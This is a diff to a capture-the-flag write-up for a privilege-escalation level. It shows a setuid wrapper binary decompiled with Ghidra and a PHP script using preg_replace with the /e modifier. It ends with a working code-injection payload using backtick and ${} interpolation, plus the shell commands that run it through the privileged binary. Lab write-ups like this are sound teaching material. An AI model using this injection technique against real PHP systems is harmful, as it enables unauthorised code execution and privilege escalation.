@@ -28,7 +28,7 @@ We found two suspicious files:
 - `/home/user/level06/level06`, a binary file.
 - `/home/user/level06/level06.php`, a php script.
 
-**Privileges**
+### Privileges
 
 We determined `/home/user/level06/level06` is a prime candidate for privilege escalation because:
 - It is owned by `flag06` (our target).
@@ -41,14 +41,66 @@ This means that, during script execution through the user `level06`, the privile
 - Effective UID: `flag06`
 - Effective GUID: `level06`
 
-** Languages **
+### Languages
 
-`/home/user/level06/level06.php` is a PHP script. PHP is an interpreted language, this means we can read it's content easily.
+`/home/user/level06/level06` is a binary executable.
+`/home/user/level06/level06.php` is a PHP script, an interpreted language.
 
-**Script behaviour**
+PHP is installed in version **5.3.10**:
+```sh
+$ php --version
+PHP 5.3.10-1ubuntu3.19 with Suhosin-Patch (cli) (built: Jul  2 2015 15:05:54) 
+Copyright (c) 1997-2012 The PHP Group
+Zend Engine v2.3.0, Copyright (c) 1998-2012 Zend Technologies
+```
 
-Let's see the content of `/home/user/level06/level06.php`.
-Here we used a [web php beautifier](https://codebeautify.org/php-beautifier) as the source code is squashed and added comments to describe the behaviour of each line.
+### Script(s) behaviour(s)
+
+**`/home/user/level06/level06`**:  
+
+We use [Ghidra](https://github.com/nationalsecurityagency/ghidra) to deassemble and analyze it's content to an equivalent of **C** to understand it's behaviour.
+
+```c
+undefined4 main(undefined4 param_1,int param_2,char **param_3) {
+  int iVar1;
+  char **__envp;
+  char *__ptr;
+  __gid_t __rgid;
+  __uid_t __ruid;
+  char *local_34;
+  char *local_30;
+  char *local_2c;
+  char *local_28;
+  undefined4 local_24;
+  undefined4 *local_18;
+  
+  __envp = param_3;
+  iVar1 = param_2;
+  local_18 = &param_1;
+  __ptr = strdup("");
+  local_28 = strdup("");
+  if (*(int *)(iVar1 + 4) != 0) {
+    free(__ptr);
+    __ptr = strdup(*(char **)(iVar1 + 4));
+    if (*(int *)(iVar1 + 8) != 0) {
+      free(local_28);
+      local_28 = strdup(*(char **)(iVar1 + 8));
+    }
+  }
+  local_30 = "/home/user/level06/level06.php";
+  local_24 = 0;
+  local_2c = __ptr;
+  execve("/usr/bin/php",&local_34,__envp);
+  return 0;
+}
+```
+
+It acts as a privileged wrapper to execute the `/home/user/level06/level06.php` PHP script.
+
+**`/home/user/level06/level06.php`**:  
+
+It is readable as is.  
+We used a [web php beautifier](https://codebeautify.org/php-beautifier) as the source code is squashed and added comments to describe the behaviour of each line.
 ```php
 #!/usr/bin/php
 <?php
@@ -79,9 +131,29 @@ print $r; // Prints the retuned formatted first process parameter.
 ?>
 ```
 
-This means we can do **arbitrary PHP code injection** as specified here... TODO
-We have to pass a string that allows execution of code in a string before it is passed to the `y()` function.
-We will need to use [PHP string interpolation](https://stackoverflow.com/questions/43437121/php-string-interpolation-syntax).
-As the string is not modified before being evaluated by the `\e` flag we are relatively fine.
+It reads the content of the specified file and executes multiple Regex obfuscation and replacement operations on it, before printing it back to STDOUT.
 
-echo '[x " . system("echo patate") . "]' > /tmp/checkflag.txt; /home/user/level06/level06.php /tmp/checkflag.txt;
+We notice the usage of `preg_replace`. It's usage with the `\e` modifier is discouraged and prevented in modern versions of PHP. It is a known vulnerability.
+
+The `preg_replace` with usage of the `\e` modifier is known to be a vulnerability and it's usage is discouraged or prevented in modern versions of PHP.
+
+**Vulnerabilitie**
+
+`/home/user/level06/level06.php` uses the `preg_replace` function with the `\e` (execute) modifier.  
+In modern versions of PHP, it is [discouraged or prevented](https://www.php.net/manual/en/function.preg-replace.php) because it is [known to](https://stackoverflow.com/questions/38039318/e-modifier-is-deprecated) easily introduce **Arbitrary Code Execution (ACE)** opportunities.
+
+The script reads raw input from a user-provided file and passes it through `preg_replace()` with the `/e` (execute) modifier. Because the regular expression captures user-controlled content and evaluates it as PHP code, the script **is susceptible to ACE**.
+
+Although the injected payload is constrained within a `y("...")` function call and wrapped in double quotes, we can bypass this boundary using string interpolation by leveraging PHP's `${...}` and `{$...}` syntax. It would force the interpreter to resolve our payload and execute the contained expression before the `y()` function is ever invoked. It also means we cannot use double-quotes ourselves to not break the 
+
+We would like to pass the following payload: `[x ${`getflag > /tmp/checkflag`}]`.  
+1. The backsticks (**\`\`**) act as a shell execution operator. PHP spawns a process to execute the contained command immediately.
+2. The curley braces (**${}**) trigger variable interpolation within the context of a double-quoted string. This forces the evaluation of the internal expression before the resolution of the surrounding string.
+
+```sh
+$ echo '[x ${`getflag > /tmp/checkflag`}]' > /tmp/exploit
+$ /home/user/level06/level06 /tmp/exploit
+$ cat /tmp/checkflag
+```
+
+And there is the flag !
